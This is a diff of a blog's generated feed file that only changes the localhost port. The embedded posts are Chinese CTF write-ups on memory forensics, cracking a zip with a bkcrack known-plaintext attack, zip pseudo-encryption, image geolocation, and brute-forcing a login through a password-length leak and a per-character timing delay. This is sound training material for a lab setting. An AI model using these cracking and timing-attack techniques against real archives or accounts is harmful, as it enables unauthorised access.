-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214856565_hu10452425151347688161.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214856565_hu18132257124737537267.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214856565_hu10452425151347688161.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214856565_hu18132257124737537267.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250528214856565&#34;
@@ -2850,10 +2850,10 @@
 		data-flex-basis=&#34;602px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;​	&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214018440.png&#34;
+&lt;p&gt;​	&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214018440.png&#34;
 	width=&#34;1511&#34;
 	height=&#34;832&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214018440_hu9628159224294594336.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214018440_hu6082378350100958410.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214018440_hu9628159224294594336.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214018440_hu6082378350100958410.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250528214018440&#34;
@@ -2868,16 +2868,16 @@
         </item>
         <item>
         <title>内存取证</title>
-        <link>http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</link>
+        <link>http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</link>
         <pubDate>Fri, 02 May 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</guid>
+        <guid>http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</guid>
         <description>&lt;h2 id=&#34;nssctf28basic-大画家&#34;&gt;NSSCTF28—Basic 大画家
 &lt;/h2&gt;&lt;p&gt;​	第一道内存取证题，拿到.mem文件后用拖进R-STUDIO找找文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504141604457.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504141604457.png&#34;
 	width=&#34;1190&#34;
 	height=&#34;780&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504141604457_hu4433089440203410594.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504141604457_hu1907882087197004958.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504141604457_hu4433089440203410594.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504141604457_hu1907882087197004958.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -2887,10 +2887,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;发现了flag.txt，但是没有flag，有提示信息，然后我们用LoveMem打开，根据画家的提示，在进程中找到了有关绘画的进程&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504141855632.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504141855632.png&#34;
 	width=&#34;1108&#34;
 	height=&#34;1027&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504141855632_hu2467886989755229994.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504141855632_hu17160849021322366118.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504141855632_hu2467886989755229994.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504141855632_hu17160849021322366118.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250504141855632&#34;
@@ -2901,10 +2901,10 @@
 		data-flex-basis=&#34;258px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504142047468.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504142047468.png&#34;
 	width=&#34;1039&#34;
 	height=&#34;1196&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504142047468_hu17622801321760914902.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504142047468_hu15790599706509034979.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504142047468_hu17622801321760914902.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250504142047468_hu15790599706509034979.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250504142047468&#34;
@@ -2918,10 +2918,10 @@
 &lt;h2 id=&#34;轩辕杯一大碗冰粉&#34;&gt;轩辕杯—一大碗冰粉
 &lt;/h2&gt;&lt;p&gt;​	题目描述：你是大黑客，这次你入侵了icej3lly的个人电脑，准备跟踪他的行踪，但是icej3lly好像并不害怕⌓‿⌓，还跟你玩起了加密游戏，甚至把提示都给你了ƪ(˘⌣˘)ʃ。但当你正在查看桌面上的秘密文件和提示时突然断电了，只留下了这个内存镜像，多疑的你一定会有所发现吧˃ʍ˂&lt;/p&gt;
 &lt;p&gt;​	先用rstuio看看，可以发现压缩包&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164108348.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164108348.png&#34;
 	width=&#34;1377&#34;
 	height=&#34;718&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164108348_hu17665150084436053729.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164108348_hu55366163940390408.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164108348_hu17665150084436053729.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164108348_hu55366163940390408.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250526164108348&#34;
@@ -2933,10 +2933,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	但是用这个工具恢复后的压缩包有错误，用bandizip打开修复一下，发现里面有mimi.zip与hint.txt，需要密码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164538818.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164538818.png&#34;
 	width=&#34;1693&#34;
 	height=&#34;735&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164538818_hu5777437573026796806.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164538818_hu9546433406366895364.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164538818_hu5777437573026796806.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164538818_hu9546433406366895364.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250526164538818&#34;
@@ -2948,10 +2948,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	同理，也可以用lovelymem导出zip，从这点看来，lovelymem是更胜一筹的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164842623.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164842623.png&#34;
 	width=&#34;1142&#34;
 	height=&#34;1019&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164842623_hu13691496084323155314.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164842623_hu8769795517015045033.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164842623_hu13691496084323155314.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526164842623_hu8769795517015045033.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250526164842623&#34;
@@ -2964,10 +2964,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;​	注意这里有两个secret.zip，都导一下（导出来是.dat文件，改一下就行），第二个是正确的，且文件没有损坏，可以不用bandizip修复。&lt;/p&gt;
 &lt;p&gt;​	然后我们需要找压缩包密码，同理，我们能找到hint文件，把他导出后发现明文攻击的提示&lt;/p&gt;
-&lt;p&gt;​	&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526165755124.png&#34;
+&lt;p&gt;​	&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526165755124.png&#34;
 	width=&#34;1702&#34;
 	height=&#34;985&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526165755124_hu8847985728582059579.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526165755124_hu11106538409163550936.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526165755124_hu8847985728582059579.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526165755124_hu11106538409163550936.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250526165755124&#34;
@@ -2979,10 +2979,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	这里需要注意的是，hint.txt提取出来是4kb的，我们只需要有文字的那一段就行，就是24个字节，所以要自己新建一个txt，不能直接用导出来的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526172117402.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526172117402.png&#34;
 	width=&#34;567&#34;
 	height=&#34;78&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526172117402_hu7804027211350027569.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526172117402_hu14876608668050143035.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526172117402_hu7804027211350027569.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526172117402_hu14876608668050143035.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250526172117402&#34;
@@ -2994,10 +2994,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	bkcrack跑一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526175750882.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526175750882.png&#34;
 	width=&#34;662&#34;
 	height=&#34;316&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526175750882_hu3668234044534767834.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526175750882_hu11141124641647794094.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526175750882_hu3668234044534767834.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526175750882_hu11141124641647794094.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250526175750882&#34;
@@ -3009,10 +3009,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	得到&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526175928559.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526175928559.png&#34;
 	width=&#34;844&#34;
 	height=&#34;313&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526175928559_hu10302593716520292753.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526175928559_hu14450607956917283219.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526175928559_hu10302593716520292753.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526175928559_hu14450607956917283219.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250526175928559&#34;
@@ -3024,10 +3024,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	疑惑谐音异或，将文件与search进行异或，得到压缩包&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180437241.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180437241.png&#34;
 	width=&#34;2013&#34;
 	height=&#34;886&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180437241_hu11109211470061598610.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180437241_hu2637980568320960182.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180437241_hu11109211470061598610.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180437241_hu2637980568320960182.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250526180437241&#34;
@@ -3039,10 +3039,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	压缩包是伪加密，工具嗦一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180701992.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180701992.png&#34;
 	width=&#34;1180&#34;
 	height=&#34;684&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180701992_hu16748987084653110767.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180701992_hu13901095844958818547.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180701992_hu16748987084653110767.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180701992_hu13901095844958818547.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250526180701992&#34;
@@ -3054,10 +3054,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	得到图片，先随波逐流一下，发现最后是图寻&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180942514.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180942514.png&#34;
 	width=&#34;809&#34;
 	height=&#34;1024&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180942514_hu11188544285212896922.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180942514_hu17040882843098075921.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180942514_hu11188544285212896922.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526180942514_hu17040882843098075921.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250526180942514&#34;
@@ -3069,10 +3069,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	exif可以看到GPS定位，然后图片中有商家，搜馋思渝回转小火锅也可以搜到&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526181149652.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526181149652.png&#34;
 	width=&#34;620&#34;
 	height=&#34;624&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526181149652_hu3291841997130213921.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526181149652_hu5612300862311494658.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526181149652_hu3291841997130213921.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526181149652_hu5612300862311494658.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250526181149652&#34;
@@ -3083,10 +3083,10 @@
 		data-flex-basis=&#34;238px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526182004570.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526182004570.png&#34;
 	width=&#34;1305&#34;
 	height=&#34;683&#34;
-	srcset=&#34;http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526182004570_hu15782906521194881553.png 480w, http://localhost:58266/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526182004570_hu8350853895020385185.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526182004570_hu15782906521194881553.png 480w, http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20250526182004570_hu8350853895020385185.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250526182004570&#34;
@@ -3109,20 +3109,20 @@
         </item>
         <item>
         <title>GHCTF2025</title>
-        <link>http://localhost:58266/p/ghctf2025/</link>
+        <link>http://localhost:1313/p/ghctf2025/</link>
         <pubDate>Tue, 11 Mar 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:58266/p/ghctf2025/</guid>
+        <guid>http://localhost:1313/p/ghctf2025/</guid>
         <description>&lt;h2 id=&#34;前言&#34;&gt;前言
 &lt;/h2&gt;&lt;p&gt;​	gh的题目都比较有质量，准备进行学习复现。&lt;/p&gt;
 &lt;h2 id=&#34;misc&#34;&gt;Misc
 &lt;/h2&gt;&lt;p&gt;​	除了取证类的题目，其他都复现一下&lt;/p&gt;
 &lt;h3 id=&#34;一mybrave&#34;&gt;一、mybrave
 &lt;/h3&gt;&lt;p&gt;​		附件一个被加密的压缩包，里面一张png。&lt;/p&gt;
-&lt;p&gt;​		&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250322200444051.png&#34;
+&lt;p&gt;​		&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250322200444051.png&#34;
 	width=&#34;1064&#34;
 	height=&#34;482&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250322200444051_hu7670275689312501026.png 480w, http://localhost:58266/p/ghctf2025/image-20250322200444051_hu1597587079750072472.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250322200444051_hu7670275689312501026.png 480w, http://localhost:1313/p/ghctf2025/image-20250322200444051_hu1597587079750072472.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -3134,10 +3134,10 @@
 &lt;p&gt;​		尝试过不是伪加密，爆破也不行。想过是已知明文攻击，不过没有已知文件，一下就没了思路&lt;/p&gt;
 &lt;p&gt;​		后来经过了解，发现已知明文攻击只需要知道连续的十二个字节即可。又正巧，png的前十二个字节是固定的，那么我们只要知道压缩包里是png，就可以尝试进行已知明文攻击。&lt;/p&gt;
 &lt;p&gt;​		那么，先搞个图片吧。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250323130655462.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250323130655462.png&#34;
 	width=&#34;1177&#34;
 	height=&#34;335&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250323130655462_hu4347431377247913873.png 480w, http://localhost:58266/p/ghctf2025/image-20250323130655462_hu1856261984717824167.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250323130655462_hu4347431377247913873.png 480w, http://localhost:1313/p/ghctf2025/image-20250323130655462_hu1856261984717824167.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -3165,10 +3165,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;​		含义是把所有压缩key为上述key的压缩包复制为新的且密码改为easy。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image.jpg&#34;
 	width=&#34;629&#34;
 	height=&#34;360&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image_hu16519246715724675748.jpg 480w, http://localhost:58266/p/ghctf2025/image_hu17435249341713994961.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image_hu16519246715724675748.jpg 480w, http://localhost:1313/p/ghctf2025/image_hu17435249341713994961.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -3179,10 +3179,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;​&lt;/p&gt;
 &lt;p&gt;​	之后用easy密码打开new.zip，可以看到图片。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250323131725918.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250323131725918.png&#34;
 	width=&#34;1066&#34;
 	height=&#34;878&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250323131725918_hu9982970488177603676.png 480w, http://localhost:58266/p/ghctf2025/image-20250323131725918_hu18271793121606184643.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250323131725918_hu9982970488177603676.png 480w, http://localhost:1313/p/ghctf2025/image-20250323131725918_hu18271793121606184643.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250323131725918&#34;
@@ -3194,10 +3194,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​		这里是个base64，把.都去掉再解码就行了。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250323132454190.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250323132454190.png&#34;
 	width=&#34;2236&#34;
 	height=&#34;201&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250323132454190_hu4272876522398608705.png 480w, http://localhost:58266/p/ghctf2025/image-20250323132454190_hu12359421956592420251.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250323132454190_hu4272876522398608705.png 480w, http://localhost:1313/p/ghctf2025/image-20250323132454190_hu12359421956592420251.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250323132454190&#34;
@@ -3211,10 +3211,10 @@
 &lt;h3 id=&#34;二myleak&#34;&gt;二、myleak
 &lt;/h3&gt;&lt;p&gt;​		附件源码，环境有一个网站。（当时没截图，现在不想浪费金币）&lt;/p&gt;
 &lt;p&gt;​		dirsearch一下，发现robots.txt，进去后，找到webinfo.md，根据链接去github上下载网站源码。&lt;/p&gt;
-&lt;p&gt;​		&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250323133110028.png&#34;
+&lt;p&gt;​		&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250323133110028.png&#34;
 	width=&#34;963&#34;
 	height=&#34;777&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250323133110028_hu12338269390409588805.png 480w, http://localhost:58266/p/ghctf2025/image-20250323133110028_hu5195174164028920266.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250323133110028_hu12338269390409588805.png 480w, http://localhost:1313/p/ghctf2025/image-20250323133110028_hu5195174164028920266.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250323133110028&#34;
@@ -3227,10 +3227,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;​		分析代码可知，登录界面有明显漏洞，有显示密码长度错误，可以通过这个确定密码长度，还有密码一位一位检测，检测到一位正确时会强制休息0.1秒，可以通过这个慢慢测出密码。（当时爆了一天）
 ​		不会写脚本可以直接丢给ai，&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/1.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/1.jpg&#34;
 	width=&#34;1794&#34;
 	height=&#34;1221&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/1_hu14616999369030470925.jpg 480w, http://localhost:58266/p/ghctf2025/1_hu16365841721167631899.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/1_hu14616999369030470925.jpg 480w, http://localhost:1313/p/ghctf2025/1_hu16365841721167631899.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;1&#34;
@@ -3242,10 +3242,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​		有密码爆进去了，但是需要认证码。提示说要找到管理员的邮箱，这里要去之前下源码的github的页面里的活动里，可以找到管理员的邮箱。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/2.jpg&#34;
